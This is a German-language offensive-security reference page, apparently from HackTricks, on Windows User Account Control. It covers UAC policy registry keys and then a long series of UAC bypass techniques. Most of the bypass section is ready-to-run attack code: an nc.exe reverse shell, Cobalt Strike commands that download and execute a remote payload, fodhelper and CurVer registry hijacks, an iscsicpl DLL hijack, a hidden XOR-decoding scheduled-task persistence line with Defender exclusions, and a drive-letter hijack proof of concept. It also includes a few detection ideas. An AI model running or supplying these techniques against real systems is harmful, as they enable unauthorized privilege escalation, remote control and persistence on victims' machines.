# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die einen **Bestätigungsdialog für erhöhte Aktivitäten** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Stufen, und ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die **das System potenziell kompromittieren könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **unter dem Sicherheitskontext eines Nicht-Administrator-Kontos ausgeführt**, sofern ein Administrator diesen Anwendungen/Aufgaben nicht ausdrücklich Administratorzugriff auf das System zur Ausführung gewährt. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, gilt jedoch nicht als Sicherheitsgrenze.

Mehr Infos zu integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiviert ist, erhält ein Administratorbenutzer 2 Tokens: einen Standardbenutzerschlüssel, um normale Aktionen auf normalem Level auszuführen, und einen mit den Admin-Rechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) beschreibt ausführlich, wie UAC funktioniert, einschließlich des Anmeldeprozesses, der Benutzererfahrung und der UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um festzulegen, wie UAC in ihrer Organisation lokal funktioniert (über `secpol.msc`) oder per Group Policy Objects (GPO) in einer Active Directory-Domäne auszurollen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) detailliert beschrieben. Es gibt 10 Group Policy-Einstellungen, die für UAC gesetzt werden können. Die folgende Tabelle bietet zusätzliche Details:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Richtlinien für die Softwareinstallation auf Windows

Die **lokalen Sicherheitsrichtlinien** ("secpol.msc" auf den meisten Systemen) sind standardmäßig so konfiguriert, dass sie **Nicht-Admin-Benutzern die Installation von Software verwehren**. Das bedeutet, dass selbst wenn ein Nicht-Admin-Benutzer das Installationsprogramm für deine Software herunterladen kann, er es ohne ein Admin-Konto nicht ausführen kann.

### Registry Keys, um UAC zur Nachfrage nach Erhöhung zu zwingen

Als Standardbenutzer ohne Admin-Rechte kannst du sicherstellen, dass das "standard"-Konto von UAC **zur Eingabe von Anmeldedaten aufgefordert** wird, wenn es versucht, bestimmte Aktionen auszuführen. Diese Aktion würde das Ändern bestimmter **Registry Keys** erfordern, wofür du Admin-Berechtigungen brauchst, sofern es keinen **UAC bypass** gibt oder der Angreifer bereits als Admin angemeldet ist.

Selbst wenn der Benutzer in der Gruppe **Administrators** ist, zwingen diese Änderungen den Benutzer dazu, seine **Kontodaten erneut einzugeben**, um administrative Aktionen auszuführen.

**Der einzige Nachteil ist, dass diese Vorgehensweise ein deaktiviertes UAC benötigt, damit sie funktioniert, was in Produktionsumgebungen eher unwahrscheinlich ist.**

Die Registry Keys und Einträge, die du ändern musst, sind die folgenden (mit ihren Standardwerten in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Local Security Policy-Tool erfolgen. Nach der Änderung werden bei administrativen Vorgängen Benutzer aufgefordert, ihre Anmeldedaten erneut einzugeben.

### Hinweis

**User Account Control ist keine Sicherheitsgrenze.** Daher können Standardbenutzer nicht aus ihren Konten ausbrechen und Administratorrechte ohne einen local privilege escalation exploit erlangen.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode verwendet Integrity Checks, um Prozesse mit hoher Integrity-Level (wie Webbrowser) daran zu hindern, auf Daten mit niedriger Integrity-Level zuzugreifen (wie den Temporary Internet Files-Ordner). Das geschieht, indem der Browser mit einem low-integrity token ausgeführt wird. Wenn der Browser versucht, auf Daten im low-integrity zone zuzugreifen, prüft das Betriebssystem den Integrity Level des Prozesses und erlaubt den Zugriff entsprechend. Diese Funktion hilft dabei, remote code execution attacks daran zu hindern, auf sensible Daten auf dem System zuzugreifen.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein access token, das eine Liste der Privileges des Benutzers enthält. Privileges werden als Kombination aus den Rechten und Fähigkeiten eines Benutzers definiert. Das Token enthält außerdem eine Liste der credentials des Benutzers, die zur Authentifizierung des Benutzers am Computer und an Ressourcen im Netzwerk verwendet werden.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, setze den **`AutoAdminLogon` registry key**. Das ist nützlich für Kiosk-Umgebungen oder zu Testzwecken. Verwende dies nur auf sicheren Systemen, da dadurch das Passwort in der registry offengelegt wird.

Setze die folgenden keys mit dem Registry Editor oder `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Um zum normalen Anmeldeverhalten zurückzukehren, setze `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachte, dass UAC bypass bei grafischem Zugriff auf das Opfer sehr einfach ist, da du einfach auf "Yes" klicken kannst, wenn die UAC-Abfrage erscheint

Der UAC bypass wird in der folgenden Situation benötigt: **UAC ist aktiviert, dein Prozess läuft in einem medium integrity context, und dein Benutzer gehört zur administrators group**.

Es ist wichtig zu erwähnen, dass es **viel schwieriger ist, die UAC zu bypassen, wenn sie auf dem höchsten Sicherheitslevel (Always) steht, als wenn sie auf einem der anderen Levels (Default) steht.**

### UAC disabled

Wenn UAC bereits disabled ist (`ConsentPromptBehaviorAdmin` ist **`0`**) kannst du **eine reverse shell mit admin privileges** (high integrity level) ausführen, zum Beispiel mit:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (voller Dateisystemzugriff)

Wenn du eine Shell mit einem Benutzer hast, der Mitglied der Administrators-Gruppe ist, kannst du das über SMB (Dateisystem) freigegebene **C$** lokal als neues Laufwerk mounten und du wirst **Zugriff auf alles innerhalb des Dateisystems** haben (sogar auf den Home-Ordner des Administrators).

> [!WARNING]
> **Sieht so aus, als würde dieser Trick nicht mehr funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC-Bypass mit cobalt strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf das maximale Sicherheitsniveau eingestellt ist
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben ebenfalls mehrere Module, um die **UAC** zu **bypass**en.

### KRBUACBypass

Dokumentation und Tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) ist eine **Kompilierung** mehrerer UAC bypass exploits. Beachte, dass du **UACME mit Visual Studio oder msbuild kompilieren** musst. Die Kompilierung erstellt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`) , du musst wissen, **welche du brauchst.**\
Du solltest **vorsichtig sein**, weil einige bypasses **andere Programme auslösen** können, die den **Benutzer** **warnen**, dass etwas passiert.

UACME hat die **Build-Version, ab der jede Technik zu funktionieren begann**. Du kannst nach einer Technik suchen, die deine Versionen betrifft:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Auch mit [this](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite erhältst du die Windows-Release `1607` aus den Build-Versionen.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binary `fodhelper.exe` wird auf modernen Windows-Versionen auto-elevated. Beim Start fragt sie den folgenden per-user Registry-Pfad ab, ohne das `DelegateExecute`-Verb zu validieren. Wenn du dort einen Befehl platzierst, kann ein Medium Integrity-Prozess (der Benutzer ist in Administrators) einen High Integrity-Prozess ohne UAC-Prompt starten.

Von fodhelper abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-Schritte (setze dein Payload, dann trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied von Administrators ist und der UAC-Level standardmäßig/locker ist (nicht Always Notify mit zusätzlichen Einschränkungen).
- Verwende den `sysnative`-Pfad, um eine 64-bit PowerShell aus einem 32-bit Prozess unter 64-bit Windows zu starten.
- Payload kann jeder beliebige Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide UI-Prompts für Stealth.

#### CurVer/extension hijack-Variante (nur HKCU)

Neuere Samples, die `fodhelper.exe` missbrauchen, umgehen `DelegateExecute` und **leiten stattdessen die `ms-settings` ProgID** über den per-user `CurVer`-Wert um. Die auto-elevated Binary löst den Handler weiterhin unter `HKCU` auf, daher wird kein Admin-Token benötigt, um die Keys zu setzen:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sobald erhöht, **deaktiviert Malware häufig zukünftige Prompts**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt, führt dann zusätzliche defense evasion durch (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und erstellt Persistence erneut, um mit hoher Integrität auszuführen. Eine typische Persistence-Task speichert ein **XOR-verschlüsseltes PowerShell-Skript** auf der Festplatte und dekodiert/führt es jede Stunde im Speicher aus:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Diese Variante bereinigt weiterhin den Dropper und lässt nur die gestageten Payloads zurück, wodurch die Erkennung davon abhängt, den **`CurVer`-Hijack**, das Tampering von `ConsentPromptBehaviorAdmin`, das Erstellen von Defender-Exclusions oder geplante Tasks zu überwachen, die PowerShell im Speicher entschlüsseln.

#### Mehr UAC bypass

**Alle** hier verwendeten Techniken zum Umgehen von AUC **erfordern** eine **vollständige interaktive Shell** mit dem Opfer (eine normale nc.exe-Shell reicht nicht aus).

Du kannst sie mit einer **meterpreter**-Session erhalten. Migriere zu einem **Prozess**, dessen **Session**-Wert gleich **1** ist:

![](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass mit GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du die **UAC-Prompt einfach akzeptieren**, wenn sie erscheint; du brauchst eigentlich keinen Bypass. Daher ermöglicht dir der Zugriff auf eine GUI, die UAC zu umgehen.

Außerdem, wenn du eine GUI-Session bekommst, die jemand benutzt hat (möglicherweise via RDP), gibt es **einige Tools, die als Administrator laufen werden**, von denen aus du zum Beispiel direkt eine **cmd** **als Admin** starten könntest, ohne erneut von UAC gefragt zu werden, wie [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das könnte etwas **stealthy** sein.

### Lauter Brute-Force UAC bypass

Wenn es dir nichts ausmacht, laut zu sein, könntest du immer einfach **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen**, das wiederholt nach einer Erhöhung der Berechtigungen fragt, bis der Benutzer es akzeptiert.

### Dein eigener Bypass - Grundlegende UAC-bypass-Methodik

Wenn du dir **UACME** anschaust, wirst du feststellen, dass die **meisten UAC bypasses eine Dll Hijacking-Schwachstelle missbrauchen** (hauptsächlich durch das Schreiben der bösartigen dll nach _C:\Windows\System32_). [Lies dies, um zu lernen, wie man eine Dll Hijacking-Schwachstelle findet](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde eine Binary, die sich **autoelevate** (prüfe, dass sie beim Ausführen auf einem hohen Integritätslevel läuft).
2. Nutze procmon, um "**NAME NOT FOUND**"-Events zu finden, die anfällig für **DLL Hijacking** sein könnten.
3. Du wirst wahrscheinlich die **DLL** in einige **geschützte Pfade** (wie C:\Windows\System32) **schreiben** müssen, für die du keine Schreibrechte hast. Das kannst du mit Folgendem umgehen:
1. **wusa.exe**: Windows 7, 8 und 8.1. Es erlaubt, den Inhalt einer CAB-Datei in geschützte Pfade zu extrahieren (weil dieses Tool aus einem hohen Integritätslevel ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereite ein **Skript** vor, um deine DLL in den geschützten Pfad zu kopieren und die verwundbare und autoelevated Binary auszuführen.

### Eine weitere UAC bypass-Technik

Sie besteht darin zu beobachten, ob eine **autoElevated binary** versucht, aus der **registry** den **Namen/Pfad** einer **binary** oder eines **command** zu **lesen**, der ausgeführt werden soll (das ist interessanter, wenn die Binary diese Information in **HKCU** sucht).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Die 32-Bit-Version `C:\Windows\SysWOW64\iscsicpl.exe` ist eine **auto-elevated** Binary, die missbraucht werden kann, um `iscsiexe.dll` per Suchreihenfolge zu laden. Wenn du eine bösartige `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner ablegen und dann den `PATH` des aktuellen Benutzers ändern kannst (zum Beispiel via `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, kann Windows die Angreifer-DLL innerhalb des erhöhten `iscsicpl.exe`-Prozesses laden, **ohne eine UAC-Prompt anzuzeigen**.

Praktische Hinweise:
- Das ist nützlich, wenn der aktuelle Benutzer in **Administrators** ist, aber wegen UAC mit **Medium Integrity** läuft.
- Die Kopie in **SysWOW64** ist die relevante für diesen Bypass. Betrachte die Kopie in **System32** als separate Binary und validiere das Verhalten unabhängig.
- Das Primitive ist eine Kombination aus **auto-elevation** und **DLL search-order hijacking**, daher ist derselbe ProcMon-Workflow, der für andere UAC bypasses verwendet wird, nützlich, um den fehlenden DLL-Load zu validieren.

Minimaler Ablauf:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Alarmiere auf `reg add` / Registry-Schreibzugriffe auf `HKCU\Environment\Path` direkt gefolgt von der Ausführung von `C:\Windows\SysWOW64\iscsicpl.exe`.
- Suche nach `iscsiexe.dll` an **benutzerkontrollierten** Speicherorten wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korrigiere `iscsicpl.exe`-Starts mit unerwarteten Child Processes oder DLL-Loads von außerhalb der normalen Windows-Verzeichnisse.

### Administrator Protection (25H2) Drive-Letter-Hijack über per-logon-session DOS device map

Windows 11 25H2 „Administrator Protection“ verwendet shadow-admin tokens mit per-session `\Sessions\0\DosDevices/<LUID>` maps. Das Verzeichnis wird von `SeGetTokenDeviceMap` beim ersten `\??`-Resolve lazy erstellt. Wenn der Angreifer den shadow-admin token nur auf **SecurityIdentification** impersoniert, wird das Verzeichnis mit dem Angreifer als **owner** erstellt (erbt `CREATOR OWNER`), wodurch Drive-Letter-Links Vorrang vor `\GLOBAL??` erhalten.

**Schritte:**

1. Aus einer Session mit niedrigen Privilegien `RAiProcessRunOnce` aufrufen, um ein promptloses shadow-admin `runonce.exe` zu starten.
2. Sein Primary Token auf ein **identification** token duplizieren und es beim Öffnen von `\??` impersonieren, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter Angreifer-Ownership zu erzwingen.
3. Dort einen `C:`-Symlink erstellen, der auf vom Angreifer kontrollierten Storage zeigt; nachfolgende Dateisystemzugriffe in dieser Session lösen `C:` auf den Angreifer-Pfad auf und ermöglichen DLL-/Datei-Hijack ohne Prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – Wie User Account Control funktioniert](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Sammlung von UAC bypass techniques](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI nutzt KI, um PowerShell Backdoors zu erzeugen](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day-Ausnutzung gegen Regierungsziele in Südostasien](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
